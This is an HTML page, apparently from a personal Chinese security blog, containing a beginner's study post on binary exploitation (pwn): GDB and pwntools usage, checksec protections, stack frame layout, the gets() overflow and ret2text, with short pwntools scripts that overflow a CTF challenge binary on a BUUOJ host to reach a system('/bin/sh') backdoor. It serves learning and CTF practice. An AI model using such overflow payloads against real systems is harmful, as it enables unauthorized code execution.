@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="mayylu">
+
+
+
+    <meta name="description" content="学习是一种生活态度">
+
+
+
+<title>二进制漏洞基础学习 | mayylu&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/vue.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">二进制漏洞基础学习</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十二月 9, 2025&nbsp;&nbsp;</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/pwn/">pwn</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>个人感觉pwn和web是安全俩个大方向，与逆向相比，pwn要更加底层，所以暂时并不打算过于深入的学习pwn，旨在了解一些简单的二进制漏洞即可<br>感觉pwn比逆向难学多了，诶，慢慢来吧，着急不得，这里暂时先把那几个常见漏洞的原理，常见利用，和加固了解一下，学的太艰难了</p>
+<span id="more"></span>
+
+<h2 id="常见pwn工具的使用"><a href="#常见pwn工具的使用" class="headerlink" title="常见pwn工具的使用"></a>常见pwn工具的使用</h2><h3 id="GDB-的使用方法"><a href="#GDB-的使用方法" class="headerlink" title="GDB 的使用方法"></a>GDB 的使用方法</h3><p>GDB（GNU Debugger）是 Linux/Unix 系统中常用的程序调试工具</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">break</span> main     <span class="comment">#打断点</span></span><br><span class="line">Breakpoint 1 at 0x40080f</span><br><span class="line">pwndbg&gt; info <span class="built_in">break</span>     <span class="comment">#查看断点</span></span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">1       breakpoint     keep y   0x000000000040080f &lt;main+4&gt;</span><br><span class="line"><span class="comment">#运行程序在main处停下          start</span></span><br><span class="line"><span class="comment">#重新启动整个程序	            run	       r</span></span><br><span class="line"><span class="comment">#单步执行，跳过子函数	        next	   n</span></span><br><span class="line"><span class="comment">#单步执行，进入子函数	        step	   s</span></span><br><span class="line"><span class="comment">#直接执行到下一断点或程序结束	continue	c</span></span><br><span class="line">pwndbg&gt; cyclic 100 <span class="comment">#生成100个字符，每8个字符组成的字符串都不相同（32位程序就是4个字符）</span></span><br><span class="line">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span><br><span class="line">pwndbg&gt; cyclic -l aaaamaaa  <span class="comment">#查找字符串的位置</span></span><br><span class="line">Finding cyclic pattern of 8 bytes: b<span class="string">&#x27;aaaamaaa&#x27;</span> (hex: 0x616161616d616161)</span><br><span class="line">Found at offset 92</span><br></pre></td></tr></table></figure>
+<h3 id="Pwntools-的使用"><a href="#Pwntools-的使用" class="headerlink" title="Pwntools 的使用"></a>Pwntools 的使用</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>检查安全机制开启情况</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RELRO:      Partial RELRO <span class="comment">#Partial RELRO：.got不可写，got.plt可写</span></span><br><span class="line">                          <span class="comment">#Full RELRO：.got和got.plt不可写</span></span><br><span class="line">Stack:      Canary found  <span class="comment">#在栈帧中保存一个随机值（canary），溢出覆盖返回地址前必须先覆盖 canary；程序在返回时检测 canary 是否改变，若改变则触发异常</span></span><br><span class="line">NX:         NX enabled   <span class="comment"># NX enabled 将栈内存权限设置为不可执⾏，从⽽⽆法简单地在栈上布置 shellcode</span></span><br><span class="line">PIE:        No PIE (0x400000) <span class="comment">#No PIE：可执行文件的基地址在编译时固定</span></span><br><span class="line">                        <span class="comment">#PIE Enabled：程序以可重定位方式加载，每次启动时基地址随机化（ASLR + PIE），使得代码段地址不可预测。</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="编写攻击脚本"><a href="#编写攻击脚本" class="headerlink" title="编写攻击脚本"></a>编写攻击脚本</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>) <span class="comment">#全局设置对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##连接程序</span></span><br><span class="line">a=process(<span class="string">&quot;./pwn1&quot;</span>) <span class="comment">#本地连接，测试程序</span></span><br><span class="line">a=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29119</span>) <span class="comment">#远程连接，测试程序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 编写payload</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0f</span>-<span class="number">0x00</span>+<span class="number">8</span>)+p64(<span class="number">0x040118a</span>)<span class="comment">#p64() 是对 64 位程序的数据进行打包，处理后形成小端序字节流</span></span><br><span class="line"><span class="comment">#注意:Python 在打印 bytes 对象时，对可打印的 ASCII 字符会直接显示字符本身,比如print(p64(0x1122334455667788))会显示成 \x88wvUD3\x11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 等待接收</span></span><br><span class="line">a.recvuntil(<span class="string">&quot;please input&quot;</span>)	<span class="comment">#等待接收到 some_string</span></span><br><span class="line">code=a.recv(N)	<span class="comment">#接收 N 个字符</span></span><br><span class="line">line=a.recvline()	<span class="comment">#直接接收一整行的输出</span></span><br><span class="line">lines=a.recvlines(N)	<span class="comment">#接收 N 个行的输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 发送数据</span></span><br><span class="line">a.sendline(payload) <span class="comment">#发送 payload，并进行换行</span></span><br><span class="line">a.sendlineafter(<span class="string">&quot;please input&quot;</span>,payload)<span class="comment">#等接受到&quot;please input&quot;后，再发送payload,内部就是封装了 recvuntil + sendline</span></span><br><span class="line">a.interactive() <span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h5><p>struct 模块可以将某些特定的结构体类型打包成二进制流的字符串<br>pwntools 里的 p32 / p64 本质就是 struct 的封装。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct.pack(<span class="string">&quot;&lt;I&quot;</span>, x)<span class="comment">#等价于p32(x)</span></span><br><span class="line">struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, x)<span class="comment">#等价于p64(x)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x12345678</span>)))<span class="comment">#[120, 86, 52, 18],最多能处理四字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x12345678</span>)))<span class="comment">#[120, 86, 52, 18, 0, 0, 0, 0]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x123456789ABCDEF0</span>)))<span class="comment">#[240, 222, 188, 154, 120, 86, 52, 18]，最多能处理8字节</span></span><br><span class="line"><span class="comment">#除了打包整形，还能打包float,免得你再去float将转换为16进制</span></span><br><span class="line">struct.pack(<span class="string">&quot;&lt;f&quot;</span>, <span class="number">3.14</span>)</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>struct 格式</th>
+<th>字节</th>
+<th>pwntools</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>uint8</td>
+<td>B</td>
+<td>1</td>
+<td>p8</td>
+</tr>
+<tr>
+<td>uint16</td>
+<td>H</td>
+<td>2</td>
+<td>p16</td>
+</tr>
+<tr>
+<td>uint32</td>
+<td>I</td>
+<td>4</td>
+<td>p32</td>
+</tr>
+<tr>
+<td>uint64</td>
+<td>Q</td>
+<td>8</td>
+<td>p64</td>
+</tr>
+<tr>
+<td>float</td>
+<td>f</td>
+<td>4</td>
+<td>无（需 struct.pack）</td>
+</tr>
+<tr>
+<td>double</td>
+<td>d</td>
+<td>8</td>
+<td>无（需 struct.pack）</td>
+</tr>
+</tbody></table>
+<h2 id="常见二进制普适漏洞及利⽤"><a href="#常见二进制普适漏洞及利⽤" class="headerlink" title="常见二进制普适漏洞及利⽤"></a>常见二进制普适漏洞及利⽤</h2><h3 id="栈缓冲区溢出"><a href="#栈缓冲区溢出" class="headerlink" title="栈缓冲区溢出"></a>栈缓冲区溢出</h3><p>栈溢出指的是程序向栈中的某个变量写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p>
+<h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>栈是汇编程序中用于管理函数调用、参数传递、局部变量和寄存器状态的内存结构。<br>它让程序能像积木一样层层调用又安全返回，是 CPU 调用机制的“中枢神经”。</p>
+<p>sp——stack point——堆栈指针寄存器，<strong>始终指向当前栈顶</strong>，是push和pop的参考坐标<br>bp——base point——基础指针,在函数执行期间固定，作为当前函数栈帧的基准点</p>
+<p>栈具有高地址在上，低地址在下的特点，即老数据在大地址，新数据在小地址，pop的时候，sp增加，push的时候sp减少</p>
+<h5 id="32位代码说明"><a href="#32位代码说明" class="headerlink" title="32位代码说明"></a>32位代码说明</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">    call foo          ; 调用 foo</span><br><span class="line"></span><br><span class="line">foo:</span><br><span class="line">       push ebp           ; 保存调用者的 EBP（即上一个函数的栈基址）</span><br><span class="line">       mov  ebp, esp      ; 当前 ESP（栈顶）成为新函数的栈基址</span><br><span class="line">       sub  esp, 0x20     ; 为局部变量分配空间（例如 32 字节）</span><br><span class="line"></span><br><span class="line">       ; -------- 函数体使用栈（用 [ebp - offset] / [ebp + offset] 访问） --------</span><br><span class="line"></span><br><span class="line">       ; 函数返回（epilogue）</span><br><span class="line">       mov  esp, ebp      ; 恢复栈顶（释放本函数的局部变量）</span><br><span class="line">       pop  ebp           ; 恢复调用者的 EBP（返回到调用者的栈帧）</span><br><span class="line">       ret                ; 从栈顶弹出返回地址并跳回（CPU 内部）等价于：RIP = [RSP] RSP += 8</span><br></pre></td></tr></table></figure>
+<p>32位栈位大小位4字节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">       ↑</span><br><span class="line">高地址 |        值                       指向</span><br><span class="line">       |--------------------------------</span><br><span class="line">       |  ... caller (main) 的栈帧 ...</span><br><span class="line">       |--------------------------------</span><br><span class="line">       | argN                          &lt;- [EBP + 8 + 4*(N-1)]</span><br><span class="line">       +--------------------------------</span><br><span class="line">       | ...                          </span><br><span class="line">       +--------------------------------</span><br><span class="line">       | arg2                         </span><br><span class="line">       +--------------------------------  &lt;- [EBP + 12]</span><br><span class="line">       | arg1                           </span><br><span class="line">       |--------------------------------  &lt;- [EBP + 8] </span><br><span class="line">       | 返回地址(call foo的下一条指令的地址，ret时弹出)        </span><br><span class="line">       |--------------------------------  ← [EBP + 4] </span><br><span class="line">       | main 的 EBP(push ebp)          </span><br><span class="line">       |--------------------------------  ← [foo函数的 EBP] </span><br><span class="line">       | 函数内局部变量区域 (32 字节)    ← [EBP - 0x20] ~ [EBP - 1]</span><br><span class="line">       |--------------------------------</span><br><span class="line">低地址  |                               ← ESP(永远指向栈顶)</span><br></pre></td></tr></table></figure>
+<p>函数的调用与返回是对称的：<br><strong>进栈多少字节，就要出栈多少字节。</strong></p>
+<h4 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h4><h5 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h5><p>gets函数是一个危险函数。因为它不检查输入的字符串长度，而是以回车来判断结束</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets((__int64)s, (__int64)argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如上述代码输入超过 15 字节，就会覆盖s 后面的栈空间，而s是main函数中的临时变量，后紧跟<code>saved RBP</code>和<code>return address</code>,溢出就会覆盖返回地址</p>
+<h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>ret2text 即控制程序执行程序本身已有的的代码(.text)。即存在危险函数如<code>system(&quot;/bin&quot;)或execv(&quot;/bin/sh&quot;)</code>的片段，可以直接劫持返回地址到目标函数地址上</p>
+<p>如何利用后门函数</p>
+<h5 id="直接调用函数"><a href="#直接调用函数" class="headerlink" title="直接调用函数"></a>直接调用函数</h5><p>可以直接调用，但是<strong>64 位系统高版本</strong>需要在调用前函数前加个ret平衡堆栈，<strong>glibc2.27</strong> 以后引入 xmm 寄存器，记录程序状态，在执行 system() 函数时会执行 movaps 指令，要求 <strong>rsp</strong> 按 16 字节对齐，需要在进入 system() 函数之前加上一个 ret 指令的地址来平衡堆栈 </p>
+<p>获取一个ret指令的地址<code>ROPgadget --binary 文件名 --only &#39;ret&#39;</code></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29798</span>)</span><br><span class="line">fuc_addr=<span class="number">0x401186</span></span><br><span class="line">ret_addr=<span class="number">0x401016</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">23</span> + p64(ret_addr) +p64(fuc_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>为什么加个ret就能平衡堆栈哪？加ret难道不会影响后面的函数跳转吗？<br>比如说注入点是gets函数，注入完成之后函数返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; 函数返回（epilogue）</span><br><span class="line">       mov  esp, ebp      ; 恢复栈顶（释放本函数的局部变量）</span><br><span class="line">       pop  ebp           ; 恢复调用者的 EBP（返回到调用者的栈帧）</span><br><span class="line">       ret                ; 从栈顶弹出返回地址并跳回（CPU 内部）等价于：RIP = [RSP] RSP += 8</span><br></pre></td></tr></table></figure>
+<p>因为返回地址是ret,所以RIP为当前插入的ret的地址，rsp指向栈中的fuc_addr<br>此时再执行一次ret,RIP为当前插入的fuc_addr的地址<br><strong>所以等于说加个ret,调用结果没有变但是RSP += 8</strong><br>为什么需要RSP += 8？<br>函数内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401186                 push    rbp</span><br><span class="line">.text:0000000000401187                 mov     rbp, rsp</span><br><span class="line">.text:000000000040118A                 lea     rdi, command    ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0000000000401191                 call    _system</span><br><span class="line">.text:0000000000401196                 nop</span><br><span class="line">.text:0000000000401197                 pop     rbp</span><br><span class="line">.text:0000000000401198                 retn</span><br></pre></td></tr></table></figure>
+<p>可以看到函数执行的时候，会先<code>push    rbp</code>,此时<code>RSP -= 8</code></p>
+<h5 id="调用system方法"><a href="#调用system方法" class="headerlink" title="调用system方法"></a>调用system方法</h5><p>其实我们只要保证<code>lea     rdi, command</code> <code>call    _system</code>这两行汇编代码执行就行了，所以我们可以选择<code>p64(40118A)</code>或者<code>p64(401187)</code>作为调用地址，只要不执行<code>push    rbp</code>,就不需要<code>ret</code></p>
+<h5 id="没有system-“-bin-sh”-，但可以自己构造"><a href="#没有system-“-bin-sh”-，但可以自己构造" class="headerlink" title="没有system(“/bin/sh”)，但可以自己构造"></a>没有system(“/bin/sh”)，但可以自己构造</h5><h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><h3 id="字符串-0-结尾"><a href="#字符串-0-结尾" class="headerlink" title="字符串 \0 结尾"></a>字符串 \0 结尾</h3><h3 id="堆缓冲区溢出"><a href="#堆缓冲区溢出" class="headerlink" title="堆缓冲区溢出"></a>堆缓冲区溢出</h3>
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2025/11/10/server/windows%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">windows基础命令</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
